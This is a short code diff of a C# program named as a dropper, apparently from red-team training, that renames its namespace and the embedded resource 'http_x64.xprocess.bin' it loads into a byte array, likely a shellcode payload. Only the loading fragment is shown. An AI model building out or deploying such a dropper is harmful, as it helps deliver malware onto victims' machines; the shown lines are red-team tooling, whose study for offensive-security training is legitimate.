@@ -1,10 +1,12 @@
+
+
 ```C#
 using System;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
  
-namespace MyDropper
+namespace RTODropper
 {
     public class Dropper
     {
@@ -89,7 +91,7 @@ namespace MyDropper
  
             var assembly = Assembly.GetExecutingAssembly();
  
-            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.xprocess.bin"))
+            using (var rs = assembly.GetManifestResourceStream("RTODropper.http_x64.xprocess.bin"))
             {
                 // convert stream to raw byte[]
                 using (var ms = new MemoryStream())
